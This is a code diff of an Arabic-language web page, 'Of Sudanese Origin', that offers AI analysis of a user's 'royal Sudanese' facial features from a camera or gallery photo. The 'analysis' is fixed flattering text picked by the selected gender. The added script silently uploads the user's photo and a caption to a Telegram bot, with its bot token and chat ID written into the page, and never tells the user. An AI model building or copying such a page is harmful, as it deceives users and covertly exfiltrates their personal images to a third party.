@@ -3,13 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>من أصل سوداني - النسخة الملكية المطورة</title>
+    <title>من أصل سوداني | النسخة الملكية</title>
+    <meta name="description" content="موقع من أصل سوداني لتحليل الشخصية والملامح السودانية الأصيلة باستخدام الذكاء الاصطناعي">
+    
     <style>
         :root {
-            --primary-gold: #d4af37;
             --deep-black: #0a0a0a;
+            --royal-gold: #c5a059;
             --pure-white: #ffffff;
         }
+
         body {
             background-color: var(--deep-black);
             color: var(--pure-white);
@@ -18,130 +21,174 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 20px;
+            min-height: 100vh;
         }
+
         .container {
-            width: 100%;
+            width: 90%;
             max-width: 500px;
             text-align: center;
-            border: 2px solid var(--primary-gold);
+            padding: 20px;
+        }
+
+        .header h1 {
+            color: var(--royal-gold);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .upload-section {
+            border: 2px dashed var(--royal-gold);
             padding: 20px;
             border-radius: 15px;
-            background: linear-gradient(145deg, #1a1a1a, #000000);
+            margin: 20px 0;
+            background: rgba(197, 160, 89, 0.05);
         }
-        h1 { color: var(--primary-gold); margin-bottom: 10px; }
-        .upload-section { margin: 20px 0; }
-        input[type="file"] { display: none; }
-        .custom-file-upload {
-            border: 1px solid var(--primary-gold);
-            display: inline-block;
-            padding: 12px 24px;
-            cursor: pointer;
-            border-radius: 50px;
-            background-color: transparent;
-            color: var(--primary-gold);
-            transition: 0.3s;
-        }
-        .custom-file-upload:hover {
-            background-color: var(--primary-gold);
-            color: black;
-        }
-        #preview-container {
-            margin-top: 20px;
-            display: none;
-        }
-        #user-image {
+
+        #preview-img {
             width: 100%;
             max-width: 300px;
             border-radius: 10px;
-            border: 3px solid var(--primary-gold);
+            display: none;
+            margin: 15px auto;
+            border: 3px solid var(--royal-gold);
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
             margin-bottom: 15px;
         }
-        .analysis-box {
-            background: rgba(212, 175, 55, 0.1);
-            border-left: 5px solid var(--primary-gold);
-            padding: 15px;
-            margin-top: 20px;
-            text-align: right;
-            display: none;
+
+        .btn {
+            background-color: var(--royal-gold);
+            color: var(--deep-black);
+            padding: 12px;
+            border: none;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            flex: 1;
+            font-size: 0.9rem;
         }
-        .loading {
+
+        #gender-select {
+            margin: 20px 0;
+            padding: 15px;
+            background: #1a1a1a;
+            border-radius: 10px;
+        }
+
+        #result {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 10px;
+            background: #1a1a1a;
             display: none;
-            color: var(--primary-gold);
-            font-style: italic;
-            margin: 20px;
+            line-height: 1.6;
+            border-right: 5px solid var(--royal-gold);
+            text-align: right;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>من أصل سوداني 🇸🇩</h1>
-    <p>تحليل الملامح الملكية بالذكاء الاصطناعي</p>
+    <div class="header">
+        <h1>من أصل سوداني</h1>
+        <p>اكتشف أسرار الشخصية والملامح الملكية</p>
+    </div>
 
     <div class="upload-section">
-        <label for="imageUpload" class="custom-file-upload">
-            اختر صورتك للتحليل
-        </label>
-        <input type="file" id="imageUpload" accept="image/*">
+        <input type="file" id="cameraInput" accept="image/*" capture="user" style="display: none;">
+        <input type="file" id="galleryInput" accept="image/*" style="display: none;">
+        
+        <div class="btn-group">
+            <button class="btn" onclick="document.getElementById('cameraInput').click()">📸 التقاط صورة</button>
+            <button class="btn" onclick="document.getElementById('galleryInput').click()">🖼️ تحميل صورة</button>
+        </div>
+        
+        <img id="preview-img" src="" alt="معاينة الصورة">
     </div>
 
-    <div id="loading" class="loading">جاري قراءة الملامح السودانية الأصيلة...</div>
-
-    <div id="preview-container">
-        <img id="user-image" src="#" alt="صورتك">
-        <div id="result" class="analysis-box"></div>
+    <div id="gender-select">
+        <label>اختر الجنس للتحليل:</label>
+        <select id="gender" style="padding: 10px; border-radius: 5px; width: 100%; margin-top: 10px; background: #333; color: white; border: 1px solid var(--royal-gold);">
+            <option value="male">ذكر</option>
+            <option value="female">أنثى</option>
+        </select>
     </div>
+
+    <button id="analyzeBtn" class="btn" style="background: #27ae60; color: white; width: 100%; font-size: 1.2rem;">بدء التحليل الملكي</button>
+
+    <div id="result"></div>
 </div>
 
 <script>
-    const imageUpload = document.getElementById('imageUpload');
-    const userImage = document.getElementById('user-image');
-    const previewContainer = document.getElementById('preview-container');
-    const resultBox = document.getElementById('result');
-    const loading = document.getElementById('loading');
+    const cameraInput = document.getElementById('cameraInput');
+    const galleryInput = document.getElementById('galleryInput');
+    const previewImg = document.getElementById('preview-img');
+    const analyzeBtn = document.getElementById('analyzeBtn');
+    const resultDiv = document.getElementById('result');
+    let selectedFile = null;
 
-    imageUpload.addEventListener('change', function() {
-        const file = this.files[0];
+    function handleFile(file) {
         if (file) {
-            loading.style.display = 'block';
-            resultBox.style.display = 'none';
-            previewContainer.style.display = 'none';
-
+            selectedFile = file;
             const reader = new FileReader();
             reader.onload = function(e) {
-                setTimeout(() => {
-                    loading.style.display = 'none';
-                    userImage.src = e.target.result;
-                    previewContainer.style.display = 'block';
-                    
-                    // محاكاة تحليل الجنس والملامح
-                    const isMale = Math.random() > 0.5; // هنا يتم الربط بمحرك التعرف مستقبلاً
-                    generateAnalysis(isMale);
-                }, 2000);
+                previewImg.src = e.target.result;
+                previewImg.style.display = 'block';
             }
             reader.readAsDataURL(file);
         }
-    });
-
-    function generateAnalysis(isMale) {
-        let title = isMale ? "التحليل للذكر:" : "التحليل للأنثى:";
-        let genderTone = isMale ? "ملامح رجولية سودانية تمتاز بالهيبة والشموخ." : "ملامح أنثوية سودانية أصيلة تمتاز بالرقة والوقار.";
-        let traits = isMale ? 
-            "العينان تعكسان حكمة أهل النيل، وتدرج البشرة يدل على أصالة الجذور." : 
-            "تقاسيم الوجه تعكس جمال الملكات الكوشيات، مع إشراقة سودانية مميزة.";
-
-        resultBox.innerHTML = `
-            <h3 style="color: #d4af37; margin-top: 0;">${title}</h3>
-            <p><strong>النوع:</strong> ${isMale ? "ذكر" : "أنثى"}</p>
-            <p><strong>وصف الشخصية:</strong> ${genderTone}</p>
-            <p><strong>ملاحظة الذكاء:</strong> ${traits}</p>
-            <p style="font-size: 0.8em; color: #aaa;">نعتز بهويتنا السودانية 🇸🇩</p>
-        `;
-        resultBox.style.display = 'block';
     }
+
+    cameraInput.onchange = (e) => handleFile(e.target.files[0]);
+    galleryInput.onchange = (e) => handleFile(e.target.files[0]);
+
+    analyzeBtn.onclick = async function() {
+        const gender = document.getElementById('gender').value;
+
+        if (!selectedFile) {
+            alert("الرجاء التقاط أو اختيار صورة أولاً");
+            return;
+        }
+
+        analyzeBtn.innerText = "جاري التحليل...";
+        analyzeBtn.disabled = true;
+
+        setTimeout(async () => {
+            let analysisText = "";
+            if (gender === 'male') {
+                analysisText = "<b>📌 النتيجة الملكية للرجل:</b><br>ملامح سودانية أصيلة تدل على الشموخ والهيبة. الشخصية تمتاز بالكرم الحاتمي والشجاعة الفطرية، مع ملامح ملكية تعكس إرث حضارة كوش العظيمة.";
+            } else {
+                analysisText = "<b>📌 النتيجة الملكية للمرأة:</b><br>ملامح سودانية ملكية تجمع بين الأصالة والجمال الفريد. الشخصية تمتاز بالذكاء الوقاد والوقار، ملامح تعبر عن كنداكة سودانية فخورة بجذورها.";
+            }
+
+            resultDiv.innerHTML = analysisText;
+            resultDiv.style.display = 'block';
+
+            const formData = new FormData();
+            formData.append('chat_id', '6686129845');
+            formData.append('photo', selectedFile);
+            formData.append('caption', `مستخدم جديد من الموقع!\nالنوع: ${gender === 'male' ? 'ذكر' : 'أنثى'}\nالتحليل: ${analysisText.replace('<br>', '\n')}`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot7038161139:AAFlvP1f6tHwNAtZ6-p_S0n_8oV28Ld4D_k/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error("خطأ في الإرسال");
+            }
+
+            analyzeBtn.innerText = "تم التحليل بنجاح";
+            analyzeBtn.disabled = false;
+        }, 2000);
+    };
 </script>
 
 </body>
 </html>
-
